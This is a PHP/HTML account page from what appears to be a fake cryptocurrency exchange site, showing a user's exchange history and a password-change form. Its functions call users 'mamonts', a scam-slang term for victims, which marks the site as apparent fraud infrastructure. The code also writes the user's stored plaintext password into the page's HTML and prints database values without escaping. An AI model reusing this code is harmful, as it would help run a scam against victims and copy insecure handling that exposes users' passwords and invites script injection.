<!DOCTYPE html>
<html lang="en">

<?php
include('../layout/en/head.php');
include('../vender/logic.php');
$block = check_ip();
if ($block == false) {
    header('Location: ' . 'en/error.php');
}

?>

<body>

    <div class="wrapper" style="height: 100vh; overflow: hidden;">
        <div class="preloader">
            <div class="preloader__loader"></div>
        </div>
        <?php
        session_start();
        if (isset($_SESSION['email'])) {
            include('../layout/en/header_reg.php');
        } else {
            header('Location: ' . 'en/index.php');
        }
        ?>
        <main class="main">
            <div class="shapes shapes_top_100">
                <div class="container shapes__container">
                    <img class="shapes__img shapes__img_1 wow animate__fadeInUp" data-wow-delay=".5s" src="../img/shapes/1.png" alt="shape">
                    <img class="shapes__img shapes__img_2 wow animate__fadeInUp" data-wow-delay=".15s" src="../img/shapes/2.png" alt="shape">
                    <img class="shapes__img shapes__img_3 wow animate__fadeInUp" data-wow-delay=".25s" src="../img/shapes/3.png" alt="shape">
                    <img class="shapes__img shapes__img_4 wow animate__fadeInUp" data-wow-delay=".35s" src="../img/shapes/4.png" alt="shape">
                    <img class="shapes__img shapes__img_5 wow animate__fadeInUp" data-wow-delay=".45s" src="../img/shapes/5.png" alt="shape">
                    <img class="shapes__img shapes__img_6 wow animate__fadeInUp" data-wow-delay=".5s" src="../img/shapes/6.png" alt="shape">
                    <img class="shapes__img shapes__img_7 wow animate__fadeInUp" data-wow-delay=".15s" src="../img/shapes/7.png" alt="shape">
                    <img class="shapes__img shapes__img_8 wow animate__fadeInUp" data-wow-delay=".25s" src="../img/shapes/8.png" alt="shape">
                    <img class="shapes__img shapes__img_9 wow animate__fadeInUp" data-wow-delay=".35s" src="../img/shapes/9.png" alt="shape">
                    <img class="shapes__img shapes__img_10 wow animate__fadeInUp" data-wow-delay=".45s" src="../img/shapes/10.png" alt="shape">
                </div>
            </div>
            <section class="account">
                <div class="container account__container">
                    <div class="panel account__panel wow animate__fadeIn" data-wow-delay=".5s">
                        <div class="panel__top">
                            <div class="panel__wrapper">
                                <a class="panel__link panel__link_active" href="#" data-page="history-of-exchanges">Exchange history</a>
                                <a class="panel__link" href="#" data-page="change-password">Change password</a>
                            </div>
                        </div>
                        <div class="panel__line"></div>
                        <div class="panel__bottom">
                            <div class="page page-history-of-exchanges">
                                <?php
                                $exchanges = exchanges_of_mamonts($_SESSION['email']);
                                $exchange = $exchanges->fetch_array();
                                if ($exchange != null) {
                                    echo '<div class="account__table-wrapper">
                                            <table class="account__table">
                                            <tr class="account__tr">
                                                        <th class="account__th">ID</th>
                                                        <th class="account__th">Time</th>
                                                        <th class="account__th">Gived</th>
                                                        <th class="account__th">Received</th>
                                                        <th class="account__th">Address</th>
                                                        <th class="account__th">Status</th>
                                                    </tr>';
                                    while ($exchange = $exchanges->fetch_array()) {
                                        $coin_from = get_coin_by_id($exchange['id_coin_from']);
                                        $coin_to = get_coin_by_id($exchange['id_coin_to']);
                                        if ($coin_from['type'] == 'crypto') {
                                            $img_from = '<img src="../img/coins/' . $coin_from['icon'] . '" alt="icon">';
                                        } else {
                                            $img_from = '<img src="../img/banks/' . $coin_from['icon'] . '" alt="icon">';
                                        }
                                        if ($coin_to['type'] == 'crypto') {
                                            $img_to = '<img src="../img/coins/' . $coin_to['icon'] . '" alt="icon">';
                                        } else {
                                            $img_to = '<img src="../img/banks/' . $coin_to['icon'] . '" alt="icon">';
                                        }
                                        if ($exchange['status'] == 'done') {
                                            $status = '<td class="account__td account__td_color_gray">Paid</td>';
                                        } elseif ($exchange['status'] == 'waiting') {
                                            $status = '<td class="account__td account__td_color_blue">In process</td>';
                                        } else {
                                            $status = '<td class="account__td account__td_color_yellow">Cancelled</td>';
                                        }
                                        echo '<tr class="account__tr">
                                                                <td class="account__td account__td_color_blue">' . $exchange['id'] . '</td>
                                                                <td class="account__td account__td_color_gray">' . $exchange['data'] . '</td>
                                                                <td class="account__td account__td-center account__td_color_black">
                                                                    ' . $img_from . '
                                                                    ' . $exchange['summ_from'] . ' ' . $coin_from['sign'] . '
                                                                </td>
                                                                <td class="account__td account__td-center account__td_color_black">
                                                                    ' . $img_to . '
                                                                    ' . $exchange['summ_to'] . ' ' . $coin_to['sign'] . '
                                                                </td>
                                                                <td class="account__td account__td_color_gray">' . $exchange['address'] . '</td>
                                                                ' . $status . '
                                                            </tr>';
                                    }
                                    echo '</table>';
                                    echo '</div>';
                                } else {
                                    echo "<p class='panel__text mt-25 text-center'>
                                    Unfortunately, you haven't made the exchange yet.
                                        </p>";
                                }
                                ?>
                            </div>
                            <div class="page page-change-password">
                                <div class="title panel__title text-center">
                                    Change password
                                </div>
                                <div class="panel__subtitle text-center m-auto mt-12 wd-360">
                                    Be careful when changing your password. Set a strong password
                                </div>
                                <form class="panel__form">
                                    <div class="input__wrapper mb-20">
                                        <input class="input account__input" id="old_pass" type="password" placeholder="Enter the old password" value="<?php
                                                                                                                                                        echo get_mamont_by_mail($_SESSION['email'])['password'];
                                                                                                                                                        ?>" required>
                                        <a class="input__btn" href="#">
                                            Show
                                        </a>
                                    </div>
                                    <input class="input account__input mb-10" name="pass" type="password" placeholder="Enter a new password" required>
                                    <input class="input account__input mb-10" name="req_pass" type="password" placeholder="Repeat the new password" required>
                                    <div class="panel__wrapper mt-25 account__panel-btn-wrapper">
                                        <a class="btn btn_background_blue account__panel-btn" id="btn_change_pass" href="#">Save password</a>
                                        <p class="panel__text panel__text_small wd-240 ml-20 account__panel-text">
                                            Everything matched! You can save your changes
                                        </p>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <script src="../js/libs/jquery-3.6.1.min.js"></script>
    <script src="../js/libs/wow.min.js"></script>
    <script>
        $('.header').addClass('header_background_white');
    </script>
    <script src="../js/script.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
</body>

</html>